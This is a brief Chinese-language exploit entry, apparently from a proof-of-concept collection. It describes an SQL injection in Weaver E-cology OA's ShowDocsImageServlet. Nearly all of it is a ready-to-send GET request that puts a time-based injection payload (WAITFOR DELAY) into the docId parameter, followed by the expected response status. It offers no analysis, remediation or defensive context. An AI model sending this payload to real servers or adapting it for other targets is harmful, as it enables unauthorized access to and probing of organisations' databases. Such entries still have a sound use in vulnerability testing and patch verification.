# 泛微E-cologyweaver.docs.docs.ShowDocsImageServlet存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+'0%3a0%3a5'<AttackCode>$ HTTP/1.1`
- **响应特征**：200